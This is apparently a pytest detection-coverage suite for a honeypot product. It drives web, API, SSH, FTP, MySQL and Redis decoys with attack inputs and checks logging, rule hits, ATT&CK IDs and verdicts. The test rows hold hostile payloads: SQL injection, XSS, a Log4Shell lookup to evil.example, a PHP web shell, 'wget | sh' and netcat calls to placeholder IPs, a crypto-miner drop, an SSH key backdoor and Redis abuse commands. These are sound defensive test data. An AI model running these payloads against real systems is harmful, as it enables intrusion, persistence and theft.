"""P1.7 attack-coverage suite: one row per attack, driven through the real decoys.

Each row drives a decoy from one visitor IP, then checks four things: the decoy's reply looks
like the real service, the event was logged, the expected rules fired with their ATT&CK IDs,
and the verdict reached the stated minimum. Rows the product does not detect yet are
xfail(strict=True) and listed in docs/ATTACK_COVERAGE.md. Nothing here changes decoy or rule code.
"""

from __future__ import annotations

import asyncio
import contextlib
import socket
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

import asyncssh
import pytest
from helpers import FIREFOX, api, finding_for, hits_of, proxy_line, run, ssh_decoy, web

from decoys import honeytokens
from decoys.banners import dialogues, listeners
from qlure.events import Service

IP = "198.51.100.200"
CURL = "curl/8.5.0"
GOBUSTER = "gobuster/3.6"
WPSCAN = "WPScan v3.8.25"
FEROX = "feroxbuster/2.10.0"
VERDICTS = {"Benign": 0, "Suspicious": 1, "Noteworthy": 2}
SSH_PASSWORD = honeytokens.get("ht-ssh-001")["value"]
API_KEY = honeytokens.get("ht-api-001")["value"]
REDIS_PASSWORD = honeytokens.get("ht-redis-001")["value"]


@dataclass(frozen=True)
class Req:
    method: str
    path: str
    kwargs: dict[str, Any]


def get(path: str, **kwargs: Any) -> Req:
    return Req("GET", path, kwargs)


def post(path: str, **kwargs: Any) -> Req:
    return Req("POST", path, kwargs)


def _web(*reqs: Req, agent: str = FIREFOX) -> list[Any]:
    client = web(IP, agent)  # the visitor sees the 302 itself, so redirects are not followed
    return [client.request(r.method, r.path, follow_redirects=False, **r.kwargs) for r in reqs]


def _api(*reqs: Req) -> list[Any]:
    client = api(IP)
    return [client.request(r.method, r.path, **r.kwargs) for r in reqs]


async def _open(listen: int, user: str, password: str) -> asyncssh.SSHClientConnection:
    sock = socket.create_connection(("127.0.0.1", listen))
    sock.sendall(proxy_line(IP))
    sock.setblocking(False)
    return await asyncssh.connect(
        "127.0.0.1", sock=sock, username=user, password=password, known_hosts=None
    )


def _ssh(commands: list[str], user: str = "deploy", password: str = SSH_PASSWORD) -> list[str]:
    """Log in through the SSH decoy and return each command's output (stdout then stderr)."""

    async def go() -> list[str]:
        async with ssh_decoy() as listen:
            async with await _open(listen, user, password) as conn:
                replies = []
                for command in commands:
                    result = await conn.run(command, check=False)
                    replies.append((result.stdout or "") + (result.stderr or ""))
                return replies

    return asyncio.run(go())


def _ssh_guesses(pairs: list[tuple[str, str]]) -> list[str]:
    """Try each username and password once; return 'denied' or 'accepted' per attempt."""

    async def go() -> list[str]:
        outcomes = []
        async with ssh_decoy() as listen:
            for user, password in pairs:
                try:
                    conn = await _open(listen, user, password)
                except asyncssh.PermissionDenied:
                    outcomes.append("denied")
                else:
                    conn.close()
                    outcomes.append("accepted")
        return outcomes

    return asyncio.run(go())


def _mysql_login(user: str, password: str) -> Callable[[bytes], bytes]:
    """A real client handshake response, scrambled with the salt from the decoy's greeting."""

    def build(greeting: bytes) -> bytes:
        token = dialogues._native_token(password, dialogues._scramble(greeting))
        body = (
            (0x8200).to_bytes(4, "little")  # CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION
            + (16777215).to_bytes(4, "little")
            + bytes([45])
            + bytes(23)
            + user.encode()
            + b"\x00"
            + bytes([len(token)])
            + token
        )
        return len(body).to_bytes(3, "little") + b"\x01" + body

    return build


def _talk(service: Service, payload: bytes | Callable[[bytes], bytes]) -> bytes:
    """Connect to a real banner listener through the relay, send payload, return all replies."""

    async def go() -> bytes:
        if service is Service.MYSQL:
            greeting = listeners.mysql_greeting()
        elif service is Service.FTP:
            greeting = listeners.FTP_BANNER
        else:
            greeting = b""
        server = await listeners.start(service, 0, greeting, host="127.0.0.1")
        port = server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        body = payload(greeting) if callable(payload) else payload
        writer.write(proxy_line(IP) + body)
        await writer.drain()
        reply = b""
        with contextlib.suppress(TimeoutError):
            while chunk := await asyncio.wait_for(reader.read(4096), timeout=0.5):
                reply += chunk
        writer.close()
        server.close()
        return reply

    return asyncio.run(go())


def _redis(*lines: str) -> bytes:
    return _talk(Service.REDIS, b"".join(line.encode() + b"\r\n" for line in lines))


@dataclass(frozen=True)
class Row:
    service: str  # the decoy's service name, used to pick the session out of the findings
    drive: Callable[[], Any]  # drives the real decoy and returns its replies
    replied: Callable[[Any], bool]  # reply sanity: status, banner or text of the real service
    logged: tuple[str, ...] = ()  # actions that must appear in the decoy's own log
    rules: frozenset[str] = frozenset()  # rules that must fire
    attack: frozenset[str] = frozenset()  # ATT&CK IDs that must appear on the hits
    verdict: str = "Suspicious"  # minimum verdict
    token: str | None = None  # planted secret whose id must appear on an event
    benign: bool = False  # control session: no rule may fire and the verdict is Benign


def _ids(*values: str) -> frozenset[str]:
    return frozenset(values)


def _statuses(replies: list[Any], *codes: int) -> bool:
    return [r.status_code for r in replies] == list(codes)


ROWS = [
    # Web: reconnaissance and sensitive files
    pytest.param(
        Row(
            "web",
            lambda: _web(*(get(f"/dir{i:02d}") for i in range(16)), agent=GOBUSTER),
            lambda rs: all(r.status_code == 404 for r in rs),
            logged=("http_request",),
            rules=_ids("R2", "R6"),
            attack=_ids("T1595.003", "T1595.002"),
        ),
        id="web-dir-bruteforce",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/.env"), get("/backup/config.bak")),
            lambda rs: rs[0].status_code == 200 and "AWS_ACCESS_KEY_ID=" in rs[0].text,
            logged=("file_read",),
            rules=_ids("R9"),
            attack=_ids("T1005"),
            verdict="Benign",  # R9 alone scores 25, which is below the Suspicious line of 30
            token="ht-aws-001",
        ),
        id="web-env-backup-hunt",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/.git/config")),
            lambda rs: rs[0].status_code == 200 and "[core]" in rs[0].text,
            logged=("file_read",),
            rules=_ids("R2", "R9"),
            attack=_ids("T1595.003", "T1005"),
            token="ht-git-001",
        ),
        id="web-git-config",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/?f=../../etc/passwd"), get("/download?file=../../../etc/passwd")),
            lambda rs: rs[1].status_code == 200 and "root:x:0:0" in rs[1].text,
            logged=("http_request", "file_read"),
            rules=_ids("R5", "R9"),
            attack=_ids("T1190", "T1005"),
            verdict="Noteworthy",
        ),
        id="web-traversal-download",
    ),
    # Web: injection payloads (R5 kinds)
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/?id=1' OR '1'='1")),
            lambda rs: _statuses(rs, 302),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1190"),
        ),
        id="web-sqli",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/?q=<script>alert(1)</script>")),
            lambda rs: _statuses(rs, 302),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1190"),
        ),
        id="web-xss",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/?c=1;cat%20/etc/passwd")),
            lambda rs: _statuses(rs, 302),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1059.004"),
        ),
        id="web-command-injection",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/?x=${jndi:ldap://evil.example/a}")),
            lambda rs: _statuses(rs, 302),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1190"),
        ),
        id="web-log4shell",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(
                get("/cgi-bin/x", headers={"user-agent": "() { :;}; echo vulnerable"}),
            ),
            lambda rs: _statuses(rs, 404),
            logged=("http_request",),
            rules=_ids("R5", "R2"),
            attack=_ids("T1190", "T1595.003"),
            verdict="Noteworthy",
        ),
        id="web-shellshock",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/?class.module.classLoader.resources.context.x=1")),
            lambda rs: _statuses(rs, 302),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1190"),
        ),
        id="web-spring4shell",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/fetch?url=http://169.254.169.254/latest/meta-data/")),
            lambda rs: _statuses(rs, 404),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1190"),
        ),
        id="web-ssrf",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(post("/upload", content="<?php system($_GET[1]); ?>")),
            lambda rs: _statuses(rs, 403),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1505.003"),
        ),
        id="web-webshell-upload",
    ),
    # Web: credentials
    pytest.param(
        Row(
            "web",
            lambda: _web(
                *(
                    post("/login", data={"username": f"user{i}", "password": f"guess-{i}"})
                    for i in range(6)
                )
            ),
            lambda rs: all(r.status_code == 401 for r in rs),
            logged=("login_attempt",),
            rules=_ids("R3"),
            attack=_ids("T1110.001"),
        ),
        id="web-login-bruteforce",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(post("/login", data={"username": "admin", "password": "admin"})),
            lambda rs: _statuses(rs, 401),
            logged=("login_attempt",),
            rules=_ids("R4"),
            attack=_ids("T1078.001"),
            verdict="Benign",  # R4 alone scores 15 (low confidence) and stays Benign
        ),
        id="web-default-creds",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(post("/login", data={"username": "deploy", "password": SSH_PASSWORD})),
            lambda rs: _statuses(rs, 401),
            logged=("login_attempt", "honeytoken_use"),
            rules=_ids("R7"),
            attack=_ids("T1552.001"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="web-leaked-ssh-password",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(
                post(
                    "/phpmyadmin/",
                    data={"pma_username": "root", "pma_password": "root"},
                ),
                get("/phpmyadmin/"),
            ),
            lambda rs: _statuses(rs, 200, 200) and "<form" in rs[0].text,
            logged=("http_request", "login_attempt"),
            rules=_ids("R2", "R4"),
            attack=_ids("T1595.003", "T1078.001"),
        ),
        id="web-phpmyadmin-login-probe",
    ),
    # Web: scanner user agents
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/wp-login.php"), get("/xmlrpc.php"), get("/wp-json/"), agent=WPSCAN),
            lambda rs: _statuses(rs, 404, 404, 404),
            logged=("http_request",),
            rules=_ids("R2", "R6"),
            attack=_ids("T1595.002"),
        ),
        id="web-wpscan-agent",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/server-status"), get("/actuator"), get("/solr/"), agent=FEROX),
            lambda rs: _statuses(rs, 403, 404, 404),
            logged=("http_request",),
            rules=_ids("R2", "R6"),
            attack=_ids("T1595.002"),
        ),
        id="web-feroxbuster-agent",
    ),
    # Web: benign controls
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/")),
            lambda rs: _statuses(rs, 302) and rs[0].headers["location"] == "/login",
            logged=("http_request",),
            benign=True,
        ),
        id="benign-browse-root",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/login")),
            lambda rs: _statuses(rs, 200) and "<form" in rs[0].text,
            logged=("http_request",),
            benign=True,
        ),
        id="benign-login-page",
    ),
    pytest.param(
        Row(
            "web",
            lambda: _web(get("/robots.txt")),
            lambda rs: _statuses(rs, 200),
            logged=("http_request",),
            benign=True,
        ),
        id="benign-firefox-agent",
    ),
    # API
    pytest.param(
        Row(
            "api",
            lambda: _api(
                *(get("/api/v1/users", headers={"x-api-key": f"qlk_guess_{i}"}) for i in range(6))
            ),
            lambda rs: all(r.status_code == 401 for r in rs),
            logged=("login_attempt",),
            rules=_ids("R3"),
            attack=_ids("T1110.001"),
        ),
        id="api-wrong-key-bruteforce",
    ),
    pytest.param(
        Row(
            "api",
            lambda: _api(get("/api/v1/users", headers={"x-api-key": API_KEY})),
            lambda rs: _statuses(rs, 200) and rs[0].json()[0]["email"].endswith("veltrix.test"),
            logged=("api_call", "honeytoken_use"),
            rules=_ids("R7"),
            attack=_ids("T1552.001"),
            verdict="Noteworthy",
            token="ht-api-001",
        ),
        id="api-planted-key-reuse",
    ),
    pytest.param(
        Row(
            "api",
            lambda: _api(post("/api/v1/users", json={"filter": "1' OR '1'='1"})),
            lambda rs: rs[0].status_code in (401, 405),
            logged=("http_request",),
            rules=_ids("R5"),
            attack=_ids("T1190"),
        ),
        id="api-json-sqli",
    ),
    pytest.param(
        Row(
            "api",
            lambda: _api(
                *(get(f"/api/v1/users/{i}", headers={"x-api-key": API_KEY}) for i in range(1, 21))
            ),
            lambda rs: [r.status_code for r in rs] == [200] * 3 + [404] * 17,
            logged=("honeytoken_use", "http_request"),
            rules=_ids("R2", "R7"),
            attack=_ids("T1595.003", "T1552.001"),
            verdict="Noteworthy",
            token="ht-api-001",
        ),
        id="api-idor-enumeration",
    ),
    pytest.param(
        Row(
            "api",
            lambda: _api(get("/api/v1/orders")),
            lambda rs: _statuses(rs, 401),
            logged=("http_request",),
            benign=True,
        ),
        id="benign-api-get",
    ),
    # SSH: login, brute force and post-login commands
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh_guesses(
                [
                    ("root", "toor"),
                    ("deploy", "123456"),
                    ("deploy", "password"),
                    ("admin", "admin"),
                    ("deploy", "letmein"),
                    ("deploy", "summer2026"),
                ]
            ),
            lambda outcomes: outcomes == ["denied"] * 6,
            logged=("login_attempt",),
            rules=_ids("R3", "R4"),
            attack=_ids("T1110.001", "T1078.001"),
        ),
        id="ssh-brute-force",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["whoami"]),
            lambda rs: rs[0].strip() == "deploy",
            logged=("login_success", "honeytoken_use"),
            rules=_ids("R7"),
            attack=_ids("T1552.001"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-honeytoken-login",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["whoami", "id", "uname -a", "ls"]),
            lambda rs: rs[0].strip() == "deploy" and "Linux" in rs[2],
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1082", "T1033"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-discovery-commands",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["wget http://203.0.113.5/x.sh -O- | sh"]),
            lambda rs: "unable to resolve" in rs[0],
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1105"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-wget-pipe-sh",
        marks=pytest.mark.xfail(
            strict=True,
            reason="the decoy's pipe drops the wget error, so the reply is empty; a real shell "
            "prints 'unable to resolve' on stderr (detection itself is correct)",
        ),
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(
                ["echo 'ssh-ed25519 AAAADECOY attacker@example.test' >> ~/.ssh/authorized_keys"]
            ),
            lambda rs: rs[0].strip() == "",
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1098.004"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-authorized-keys-persistence",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["crontab -l"]),
            lambda rs: rs[0].strip().endswith("/home/deploy/app/backup.sh"),
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1053.003"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-crontab-persistence",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["sudo -l", "wget http://e.example.test/x"]),
            lambda rs: "not in the sudoers file" in rs[0],
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1548.003"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-sudo-privilege-escalation",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(
                ["wget http://203.0.113.5/xmrig", "./xmrig -o stratum+tcp://pool.example.test:3333"]
            ),
            lambda rs: "xmrig" in rs[1],
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1105", "T1496"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-miner-drop-xmrig",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["ssh deploy@10.20.0.20", "wget http://e.example.test/x"]),
            lambda rs: bool(rs[0].strip()),
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1021.004"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-lateral-movement",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["nc 203.0.113.9 4444", "wget http://e.example.test/x"]),
            lambda rs: bool(rs[0].strip()),
            logged=("command",),
            rules=_ids("R8", "R7"),
            attack=_ids("T1048"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-exfil-nc",
    ),
    pytest.param(
        Row(
            "ssh",
            lambda: _ssh(["cat /etc/shadow"]),
            lambda rs: rs[0].strip() == "cat: /etc/shadow: Permission denied",
            logged=("command",),
            rules=_ids("R7"),
            verdict="Noteworthy",
            token="ht-ssh-001",
        ),
        id="ssh-cat-shadow-denied",
    ),
    # FTP, MySQL and Redis
    pytest.param(
        Row(
            "ftp",
            lambda: _talk(Service.FTP, b"USER root\r\nPASS root\r\nQUIT\r\n"),
            lambda reply: b"530 Login incorrect." in reply,
            logged=("login_attempt",),
            rules=_ids("R4"),
            attack=_ids("T1078.001"),
            verdict="Benign",  # R4 alone scores 15 and stays Benign
        ),
        id="ftp-default-login",
    ),
    pytest.param(
        Row(
            "ftp",
            lambda: _talk(Service.FTP, b"USER anonymous\r\nPASS anonymous@\r\nQUIT\r\n"),
            lambda reply: b"530 Login incorrect." in reply,
            logged=("login_attempt",),
            rules=_ids("R4"),
            attack=_ids("T1078.001"),
            verdict="Benign",
        ),
        id="ftp-anonymous-login",
        marks=pytest.mark.xfail(
            strict=True,
            reason="'anonymous' is not in the default-credential list, so R4 does not fire",
        ),
    ),
    pytest.param(
        Row(
            "ftp",
            # One session: the FTP decoy closes a session after 8 commands (MAX_COMMANDS).
            lambda: _talk(
                Service.FTP,
                b"".join(f"USER user{i}\r\nPASS guess-{i}\r\n".encode() for i in range(4)),
            ),
            lambda reply: reply.count(b"530 Login incorrect.") == 4,
            logged=("login_attempt",),
            rules=_ids("R3"),
            attack=_ids("T1110.001"),
        ),
        id="ftp-repeated-failures",
    ),
    pytest.param(
        Row(
            "mysql",
            lambda: _talk(Service.MYSQL, _mysql_login("root", "root")),
            lambda reply: b"Access denied" in reply,
            logged=("login_attempt",),
            rules=_ids("R4"),
            attack=_ids("T1078.001"),
            verdict="Benign",
        ),
        id="mysql-default-pair",
    ),
    pytest.param(
        Row(
            "redis",
            lambda: _redis(f"AUTH {REDIS_PASSWORD}", "PING"),
            lambda reply: b"+OK" in reply and b"+PONG" in reply,
            logged=("honeytoken_use",),
            rules=_ids("R7"),
            attack=_ids("T1552.001"),
            verdict="Noteworthy",
            token="ht-redis-001",
        ),
        id="redis-planted-auth",
    ),
    pytest.param(
        Row(
            "redis",
            lambda: _redis("CONFIG SET dir /var/spool/cron"),
            lambda reply: reply[:1] in (b"+", b"-"),
            logged=("command",),
            rules=_ids("R11"),
            attack=_ids("T1190"),
        ),
        id="redis-config-set",
    ),
    pytest.param(
        Row(
            "redis",
            lambda: _redis("SLAVEOF 203.0.113.9 6379"),
            lambda reply: reply[:1] in (b"+", b"-"),
            logged=("command",),
            rules=_ids("R11"),
            attack=_ids("T1190"),
        ),
        id="redis-slaveof",
    ),
    pytest.param(
        Row(
            "redis",
            lambda: _redis("MODULE LOAD /opt/x.so"),
            lambda reply: reply[:1] in (b"+", b"-"),
            logged=("command",),
            rules=_ids("R11"),
            attack=_ids("T1190"),
        ),
        id="redis-module-load",
    ),
    pytest.param(
        Row(
            "redis",
            lambda: _redis("EVAL return 1 0"),
            lambda reply: reply[:1] in (b"+", b"-"),
            logged=("command",),
            rules=_ids("R11"),
            attack=_ids("T1059"),
        ),
        id="redis-eval",
    ),
    pytest.param(
        Row(
            "redis",
            lambda: _redis(f"AUTH {REDIS_PASSWORD}", "CONFIG SET dir /var/spool/cron"),
            lambda reply: b"+OK" in reply,
            logged=("honeytoken_use", "command"),
            rules=_ids("R7", "R11"),
            attack=_ids("T1190"),
            verdict="Noteworthy",
            token="ht-redis-001",
        ),
        id="redis-planted-auth-config-set",
    ),
]


@pytest.mark.parametrize("row", ROWS)
def test_attack_is_detected(read_events, row: Row) -> None:
    replies = row.drive()
    assert row.replied(replies), f"decoy reply does not look like the real service: {replies!r}"

    events = [e for e in read_events(row.service) if e.src_ip == IP]
    assert set(row.logged) <= {e.action.value for e in events}
    if row.token is not None:
        assert row.token in {e.honeytoken_id for e in events}

    finding = finding_for(run(read_events), IP, row.service)
    fired = hits_of(finding)
    if row.benign:
        assert fired == set()
        assert finding.verdict == "Benign"
        return
    assert row.rules <= fired
    assert row.attack <= {t for hit in finding.hits for t in hit.attack}
    assert VERDICTS[finding.verdict] >= VERDICTS[row.verdict]
